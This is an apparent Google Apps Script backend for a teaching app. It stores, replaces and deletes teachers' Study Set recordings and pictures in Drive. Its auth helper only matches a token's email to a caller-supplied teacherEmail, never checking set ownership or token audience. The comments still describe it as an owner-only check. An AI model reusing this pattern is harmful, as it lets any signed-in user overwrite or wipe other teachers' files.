// v1.22.0 (Session 66) — image folder helper. Symmetric to
// getAudioFolder — parallel Drive folder keeps images and audio
// filterable / countable separately.
function getImageFolder() {
  var folders = DriveApp.getFoldersByName(IMAGE_FOLDER_NAME);
  if (folders.hasNext()) {
    return folders.next();
  }
  return DriveApp.createFolder(IMAGE_FOLDER_NAME);
}

// ==================== Session 63 Phase 3 — Study Set audio ====================

var STUDY_SETS_ROOT = 'StudySets';

/**
 * Find or create the root StudySets folder in Drive. Nested folders
 * per set are created on-demand by getStudySetFolder.
 */
function getStudySetRootFolder() {
  var folders = DriveApp.getFoldersByName(STUDY_SETS_ROOT);
  if (folders.hasNext()) return folders.next();
  return DriveApp.createFolder(STUDY_SETS_ROOT);
}

/**
 * Find or create the folder for a specific set.
 * Layout: StudySets/{setId}/
 * We namespace by setId (not teacherEmail) because setId is a UUID
 * that's already unique across teachers, and it keeps the browsing
 * UX in Drive Console simpler.
 */
function getStudySetFolder(setId) {
  var root = getStudySetRootFolder();
  var subs = root.getFoldersByName(setId);
  if (subs.hasNext()) return subs.next();
  return root.createFolder(setId);
}

/**
 * Verify the caller's Google idToken and confirm the email in the
 * token matches payload.teacherEmail. This is the "only the set owner
 * can upload for their set" check — no cross-Firestore reads needed
 * because setId + teacherEmail travel together on every request.
 * Returns true iff auth passed and emails match (case-insensitive).
 */
function requireStudySetAuth(payload) {
  if (!payload || !payload.idToken || !payload.teacherEmail) return false;
  try {
    var url = 'https://oauth2.googleapis.com/tokeninfo?id_token=' +
              encodeURIComponent(payload.idToken);
    var resp = UrlFetchApp.fetch(url, { muteHttpExceptions: true });
    if (resp.getResponseCode() !== 200) return false;
    var info = JSON.parse(resp.getContentText());
    if (!info || !info.email || info.email_verified !== 'true') return false;
    var callerEmail = String(info.email).trim().toLowerCase();
    var claimed = String(payload.teacherEmail).trim().toLowerCase();
    return callerEmail === claimed;
  } catch (e) {
    Logger.log('requireStudySetAuth error: ' + e.toString());
    return false;
  }
}

/**
 * Sanitize an id / key for use as a filename fragment. Strips path
 * separators, control chars, and anything that could escape the
 * intended Drive folder. Keeps alphanumeric + a couple of safe punct.
 */
function safeFileFragment(s) {
  if (!s) return '';
  return String(s).replace(/[^A-Za-z0-9_\-.]/g, '_').substring(0, 128);
}

/**
 * Upload a teacher recording for a Study Set word. Writes to
 * StudySets/{setId}/{audioKey}.m4a and returns the Drive download URL.
 * Same content-cap as regular contributions (2 MB post-decode).
 */
function handleStudySetUploadAudio(payload) {
  if (!requireStudySetAuth(payload)) {
    return jsonResponse({ status: 'error', message: 'unauthorized' });
  }
  var setId = safeFileFragment(payload.setId);
  var audioKey = safeFileFragment(payload.audioKey);
  if (!setId || !audioKey) {
    return jsonResponse({ status: 'error', message: 'missing setId or audioKey' });
  }
  if (!payload.audioBase64 || typeof payload.audioBase64 !== 'string') {
    return jsonResponse({ status: 'error', message: 'missing audioBase64' });
  }
  var maxBase64 = Math.ceil(MAX_AUDIO_BYTES * 4 / 3) + 100;
  if (payload.audioBase64.length > maxBase64) {
    return jsonResponse({ status: 'error', message: 'audio too large' });
  }
  try {
    var decoded = Utilities.base64Decode(payload.audioBase64);
    if (decoded.length > MAX_AUDIO_BYTES) {
      return jsonResponse({ status: 'error', message: 'audio too large' });
    }
    var folder = getStudySetFolder(setId);
    // If a file with the same name already exists (re-record path),
    // delete the old one first so we don't accumulate stale files
    // and so the returned URL always points at the latest recording.
    var fileName = audioKey + '.m4a';
    var existing = folder.getFilesByName(fileName);
    while (existing.hasNext()) {
      try {
        existing.next().setTrashed(true);
      } catch (delErr) {
        Logger.log('handleStudySetUploadAudio delete-old failed: ' + delErr);
      }
    }
    var blob = Utilities.newBlob(decoded, 'audio/m4a', fileName);
    var file = folder.createFile(blob);
    file.setSharing(DriveApp.Access.ANYONE_WITH_LINK, DriveApp.Permission.VIEW);
    return jsonResponse({
      status: 'ok',
      audioUrl: file.getDownloadUrl(),
      fileId: file.getId()
    });
  } catch (err) {
    Logger.log('handleStudySetUploadAudio error: ' + err.toString());
    return jsonResponse({ status: 'error', message: 'upload failed' });
  }
}

/**
 * Delete a single recording (re-record cleanup, or word-removed).
 */
function handleStudySetDeleteAudio(payload) {
  if (!requireStudySetAuth(payload)) {
    return jsonResponse({ status: 'error', message: 'unauthorized' });
  }
  var setId = safeFileFragment(payload.setId);
  var audioKey = safeFileFragment(payload.audioKey);
  if (!setId || !audioKey) {
    return jsonResponse({ status: 'error', message: 'missing setId or audioKey' });
  }
  try {
    var folder = getStudySetFolder(setId);
    var files = folder.getFilesByName(audioKey + '.m4a');
    var deleted = 0;
    while (files.hasNext()) {
      try {
        files.next().setTrashed(true);
        deleted++;
      } catch (_) {}
    }
    return jsonResponse({ status: 'ok', deleted: deleted });
  } catch (err) {
    Logger.log('handleStudySetDeleteAudio error: ' + err.toString());
    return jsonResponse({ status: 'error', message: 'delete failed' });
  }
}

/**
 * Wipe the whole folder for a set (set-delete flow).
 */
function handleStudySetDeleteSetAudio(payload) {
  if (!requireStudySetAuth(payload)) {
    return jsonResponse({ status: 'error', message: 'unauthorized' });
  }
  var setId = safeFileFragment(payload.setId);
  if (!setId) {
    return jsonResponse({ status: 'error', message: 'missing setId' });
  }
  try {
    var root = getStudySetRootFolder();
    var subs = root.getFoldersByName(setId);
    var deleted = 0;
    while (subs.hasNext()) {
      try {
        subs.next().setTrashed(true);
        deleted++;
      } catch (_) {}
    }
    return jsonResponse({ status: 'ok', deletedFolders: deleted });
  } catch (err) {
    Logger.log('handleStudySetDeleteSetAudio error: ' + err.toString());
    return jsonResponse({ status: 'error', message: 'delete failed' });
  }
}

// ────────────────────────────────────────────────────────────────
// v1.22.0 (Session 66) — Study Set pictures. Parallel to audio.
// Uses the per-set Drive folder (same one that holds the m4a files)
// so the picture lives alongside the audio and gets deleted with the
// set if the teacher removes it.
// ────────────────────────────────────────────────────────────────

function handleStudySetUploadImage(payload) {
  if (!requireStudySetAuth(payload)) {
    return jsonResponse({ status: 'error', message: 'unauthorized' });
  }
  var setId = safeFileFragment(payload.setId);
  var imageKey = safeFileFragment(payload.imageKey);
  if (!setId || !imageKey) {
    return jsonResponse({ status: 'error', message: 'missing setId or imageKey' });
  }
  if (!payload.imageBase64 || typeof payload.imageBase64 !== 'string') {
    return jsonResponse({ status: 'error', message: 'missing imageBase64' });
  }
  var ext = (payload.imageExt === 'png') ? 'png' : 'jpg';
  var mime = (ext === 'png') ? 'image/png' : 'image/jpeg';
  var maxBase64 = Math.ceil(MAX_IMAGE_BYTES * 4 / 3) + 100;
  if (payload.imageBase64.length > maxBase64) {
    return jsonResponse({ status: 'error', message: 'image too large' });
  }
  try {
    var decoded = Utilities.base64Decode(payload.imageBase64);
    if (decoded.length > MAX_IMAGE_BYTES) {
      return jsonResponse({ status: 'error', message: 'image too large' });
    }
    var folder = getStudySetFolder(setId);
    // Overwrite existing picture with same key so re-upload path
    // returns a URL pointing at the newest picture.
    var fileName = imageKey + '.' + ext;
    var existing = folder.getFilesByName(fileName);
    while (existing.hasNext()) {
      try {
        existing.next().setTrashed(true);
      } catch (delErr) {
        Logger.log('handleStudySetUploadImage delete-old failed: ' + delErr);
      }
    }
    // Also trash any stale copy with the OTHER extension.
    var otherExt = (ext === 'png') ? 'jpg' : 'png';
    var stale = folder.getFilesByName(imageKey + '.' + otherExt);
    while (stale.hasNext()) {
      try { stale.next().setTrashed(true); } catch (_) {}
    }
    var blob = Utilities.newBlob(decoded, mime, fileName);
    var file = folder.createFile(blob);
    file.setSharing(DriveApp.Access.ANYONE_WITH_LINK, DriveApp.Permission.VIEW);
    return jsonResponse({
      status: 'ok',
      imageUrl: file.getDownloadUrl(),
      fileId: file.getId()
    });
  } catch (err) {
    Logger.log('handleStudySetUploadImage error: ' + err.toString());
    return jsonResponse({ status: 'error', message: 'upload failed' });
  }
}

function handleStudySetDeleteImage(payload) {
  if (!requireStudySetAuth(payload)) {
    return jsonResponse({ status: 'error', message: 'unauthorized' });
  }
  var setId = safeFileFragment(payload.setId);
  var imageKey = safeFileFragment(payload.imageKey);
  if (!setId || !imageKey) {
    return jsonResponse({ status: 'error', message: 'missing setId or imageKey' });
  }
  try {
    var folder = getStudySetFolder(setId);
    var deleted = 0;
    var exts = ['jpg', 'png'];
    for (var i = 0; i < exts.length; i++) {
      var files = folder.getFilesByName(imageKey + '.' + exts[i]);
      while (files.hasNext()) {
        try {
          files.next().setTrashed(true);
          deleted++;
        } catch (_) {}
      }
    }
    return jsonResponse({ status: 'ok', deleted: deleted });
  } catch (err) {
    Logger.log('handleStudySetDeleteImage error: ' + err.toString());
    return jsonResponse({ status: 'error', message: 'delete failed' });
  }
}

function jsonResponse(data) {
  return ContentService.createTextOutput(JSON.stringify(data))
    .setMimeType(ContentService.MimeType.JSON);
}

function doGet(e) {
  return jsonResponse({
    status: 'ok',
    service: 'Awing Contributions',
    timestamp: new Date().toISOString()
  });
}
